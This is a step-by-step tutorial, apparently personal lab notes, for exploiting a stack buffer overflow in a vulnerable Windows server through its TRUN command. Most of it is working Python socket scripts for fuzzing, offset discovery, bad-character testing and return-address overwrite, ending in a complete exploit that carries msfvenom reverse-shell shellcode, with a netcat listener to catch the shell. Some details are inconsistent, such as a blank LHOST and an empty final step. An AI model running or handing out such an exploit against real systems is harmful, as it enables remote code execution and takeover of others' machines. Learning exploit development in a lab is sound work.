Open the exe file as admin
Go to Debugger and then File -> Attach and then select the program.

## Step 1: SPIKING (Find vulnerable part of program)

Connect to the vuln application
```bash
nc -nv (ip addr of your windows machine it is running on) (port number): my ip is 10.0.0.52
```
Now throw bunch of charecters in each command and see if any of the commands accepted by the application is vulnerable
TO throw bunch of charecter we use 
```bash
./generic_send_tcp (ip adddr) (port) (some.spk) 
```
some.spk will look like: you can send as many charecter. just try to break the program
```bash
s_readline();
s_string("Some command name to test ");
s_string_variable("0");
```

Look you have to overwrite everything(ESP, EBP) till EIP. EIP will help to get the root access to anything.
************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************

## Step 2: Fuzzing (Send bunch of charecter to break the program)
Use the below python code for a fuzzing script to break the specific command.
```bash
#!/usr/bin/python
import sys, socket
from time import sleep

# Define target IP and port
target_ip = '10.0.0.52'
target_port = 9999

buffer = "A" * 100

while True:
	try:
		s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((target_ip, target_port))
		
		s.send(('TRUN /.:/' + buffer).encode())
		s.close()
		sleep(1)
		buffer = buffer + "A"*100
		
	except:
		print("Fuzzing crashed at %s bytes" % str(len(buffer)))
		sys.exit()
```
then do
```bash
chmod +x file.py
```
Then run the file

```bash
./file.py
```

************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************
## Step 3: Finding the offset (At what point it breaks)

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l (length from the previous output + some random offset to be safe)
```

Create another python file and use the following code:
```bash
#!/usr/bin/python
import sys, socket

# Define target IP and port
target_ip = '10.0.0.52'
target_port = 9999

offset = "(The value from the previous metasploit command)"

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target_ip, target_port))
	
	s.send(('TRUN /.:/' + offset).encode())
	s.close()
	
except:
	print("Error Connecting to server")
	sys.exit()
```
Make the file executable
```bash
chmod +x file.py
```
Then run the file

```bash
./file.py
```

Copy the Number in front of EIP column in immunity debugger and then use the following command

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 3000 -q (value in front of EIP)
```

************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************
## Step 4: Overwriting the EIP
Make another .py file to check EIP final and overwrite it

```bash
#!/usr/bin/python
import sys, socket

# Define target IP and port
target_ip = '10.0.0.52'
target_port = 9999

shellcode = "A" * number from previous meta command + "B" * 4

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target_ip, target_port))
	
	s.send(('TRUN /.:/' + shellcode).encode())
	s.close()
	
except:
	print("Error Connecting to server")
	sys.exit()
```

Run the above file and see if it is the desired output

************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************
## Step 5: Finding the Bad Charecters
BadChar List
```bash
badchars = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)
```


Then create a new file and use the below code

```bash
#!/usr/bin/python
import sys, socket

# Define target IP and port
target_ip = '10.0.0.52'
target_port = 9999

badchars = (
  "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
  "\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
  "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
  "\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
  "\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"
  "\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"
  "\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"
  "\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"
  "\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"
  "\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"
  "\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"
  "\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"
  "\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"
  "\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"
  "\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
  "\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")


shellcode = "A" * 2003 + "B" * 4 + badchars

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target_ip, target_port))
	
	s.send(('TRUN /.:/' + shellcode).encode())
	s.close()
	
except:
	print("Error Connecting to server")
	sys.exit()
```
Run the above file


Right click on the ESP in immunity debugger-> follow in dump

check the hex code and see if something is missing or messed up. If there are two consecutive messed up numbers only the first one is the bad char but to be on safer side take out both.


************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************
## Step 6: Finding the right module
Attach your vuln file again and 
Go to immunity debugger and in the bottom search bar write

```bash
!mona modules
```

Search for the module with all falses in the table and related to your vuln application

-- Now find opcode equivalent for jump ESP. So go to kali
and write

```
locate nasm_shell
```
Then take the command below and paste it in the terminal.
```
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
```
After that in the shell that appears

```bash
JMP ESP
```
Then copy the equivalent and go to immunity debugger and in the botton search bar write

```bash
!mona find -s "\xff\xe4" -m modulename.dll
```
Instead of "\xff\xe4" it will be your opcode for jump

Go Back to Kali linux and make another .py file and paste the following code in

```bash

#!/usr/bin/python
import sys, socket

# Define target IP and port
target_ip = '10.0.0.52'
target_port = 9999


#Copy the addresses one by one from the list. Current = 625011af

shellcode = "A" * 2003 + "\xaf\x11\x50\x62"

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target_ip, target_port))
	
	s.send(('TRUN /.:/' + shellcode).encode())
	s.close()
	
except:
	print("Error Connecting to server")
	sys.exit()

```
The return address thing will be in reverse as written in the code above

Go to debugger again

Click on the bluish black arrow on teh topbar and enter the address, in this case its 625011af
Then click ok and you should see the address. 
Then press F2 on the keyboard, to set a breakpoint.


-- Run the immunity debugger and run the .py file you have
************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************
## Step 7: Generating shellcode

To generate the shellcode, use the following command
The LHOST is the ipaddress of kali machine: 10.0.2.255
```bash
msfvenom -p windows/shell_reverse_tcp LHOST= LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
```
This will generate the shellcode and now copy it for the python script

```bash
#!/usr/bin/python
import sys, socket

# Define target IP and port
target_ip = '10.0.0.52'
target_port = 9999

overflow = (
"\xdd\xc1\xd9\x74\x24\xf4\x5e\x29\xc9\xb1\x52\xb8\x51\xfa"
"\x75\xb7\x31\x46\x17\x03\x46\x17\x83\x97\xfe\x97\x42\xeb"
"\x17\xd5\xad\x13\xe8\xba\x24\xf6\xd9\xfa\x53\x73\x49\xcb"
"\x10\xd1\x66\xa0\x75\xc1\xfd\xc4\x51\xe6\xb6\x63\x84\xc9"
"\x47\xdf\xf4\x48\xc4\x22\x29\xaa\xf5\xec\x3c\xab\x32\x10"
"\xcc\xf9\xeb\x5e\x63\xed\x98\x2b\xb8\x86\xd3\xba\xb8\x7b"
"\xa3\xbd\xe9\x2a\xbf\xe7\x29\xcd\x6c\x9c\x63\xd5\x71\x99"
"\x3a\x6e\x41\x55\xbd\xa6\x9b\x96\x12\x87\x13\x65\x6a\xc0"
"\x94\x96\x19\x38\xe7\x2b\x1a\xff\x95\xf7\xaf\x1b\x3d\x73"
"\x17\xc7\xbf\x50\xce\x8c\xcc\x1d\x84\xca\xd0\xa0\x49\x61"
"\xec\x29\x6c\xa5\x64\x69\x4b\x61\x2c\x29\xf2\x30\x88\x9c"
"\x0b\x22\x73\x40\xae\x29\x9e\x95\xc3\x70\xf7\x5a\xee\x8a"
"\x07\xf5\x79\xf9\x35\x5a\xd2\x95\x75\x13\xfc\x62\x79\x0e"
"\xb8\xfc\x84\xb1\xb9\xd5\x42\xe5\xe9\x4d\x62\x86\x61\x8d"
"\x8b\x53\x25\xdd\x23\x0c\x86\x8d\x83\xfc\x6e\xc7\x0b\x22"
"\x8e\xe8\xc1\x4b\x25\x13\x82\x79\xba\x19\xad\x16\xb8\x1d"
"\x40\xbb\x35\xfb\x08\x53\x10\x54\xa5\xca\x39\x2e\x54\x12"
"\x94\x4b\x56\x98\x1b\xac\x19\x69\x51\xbe\xce\x99\x2c\x9c"
"\x59\xa5\x9a\x88\x06\x34\x41\x48\x40\x25\xde\x1f\x05\x9b"
"\x17\xf5\xbb\x82\x81\xeb\x41\x52\xe9\xaf\x9d\xa7\xf4\x2e"
"\x53\x93\xd2\x20\xad\x1c\x5f\x14\x61\x4b\x09\xc2\xc7\x25"
"\xfb\xbc\x91\x9a\x55\x28\x67\xd1\x65\x2e\x68\x3c\x10\xce"
"\xd9\xe9\x65\xf1\xd6\x7d\x62\x8a\x0a\x1e\x8d\x41\x8f\x3e"
"\x6c\x43\xfa\xd6\x29\x06\x47\xbb\xc9\xfd\x84\xc2\x49\xf7"
"\x74\x31\x51\x72\x70\x7d\xd5\x6f\x08\xee\xb0\x8f\xbf\x0f"
"\x91")


shellcode = "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + overflow

try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((target_ip, target_port))
	
	s.send(('TRUN /.:/' + shellcode).encode())
	s.close()
	
except:
	print("Error Connecting to server")
	sys.exit()
```

x90 is just like padding to avoid overwriting

Now open another terminal and write the following:

```bash
nc -nvlp 4444
```
nd now run the .py file

************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************
## Step 8: Gain Root
************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************************




